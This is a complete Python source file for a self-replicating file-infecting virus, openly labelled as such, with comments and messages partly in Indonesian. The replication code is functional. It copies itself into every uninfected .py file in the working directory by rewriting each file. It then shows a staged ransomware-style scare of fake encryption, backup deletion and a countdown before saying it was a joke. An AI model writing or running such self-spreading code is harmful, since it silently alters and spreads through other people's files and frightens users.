# VIRUS SAYS HI!

import sys
import glob
import os
import time

virus_code = []
with open(sys.argv[0], 'r', encoding='utf-8') as f:
    lines = f.readlines()

copying = False
for line in lines:
    if line.strip() == "# VIRUS SAYS HI!":
        copying = True
    if copying:
        virus_code.append(line)
    if line.strip() == "# VIRUS SAYS BYE!":
        break

python_files = glob.glob("*.py")
for file in python_files:
    if file == os.path.basename(__file__):
        continue
    with open(file, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()
    if "# VIRUS SAYS HI!" in content:
        continue
    with open(file, 'w', encoding='utf-8') as f:
        f.writelines(virus_code)
        f.write('\n# File ini sudah diinfeksi virus "Apocalypse Imminent"\n\n')
        f.write(content)

def apocalypse_imminent():
    os.system('cls' if os.name == 'nt' else 'clear')
    red = '\033[91m'
    reset = '\033[0m'
    print(red + "="*60)
    print("!!! SYSTEM ALERT: APOCALYPSE IMMINENT !!!")
    print("="*60 + reset)
    print("\nWARNING! Your system has been infected by a deadly virus.\n")
    time.sleep(2)
    for i in range(10, 0, -1):
        print(f"System meltdown in: {i} seconds", end='\r')
        time.sleep(1)
    print("\n\n" + red + "!! EXECUTING FINAL PHASE !!" + reset)
    time.sleep(2)
    print("\nEncrypting all files... [████████████████████]")
    time.sleep(2)
    print("Deleting backups... [████████████████████]")
    time.sleep(2)
    print(red + "\n!!! YOUR DATA IS GONE FOREVER !!!\n" + reset)
    time.sleep(2)
    print("Just kidding! 😅 Jangan Panik.")
    print("No files were harmed. HEHEHE! ✌️")

apocalypse_imminent()

# VIRUS SAYS BYE!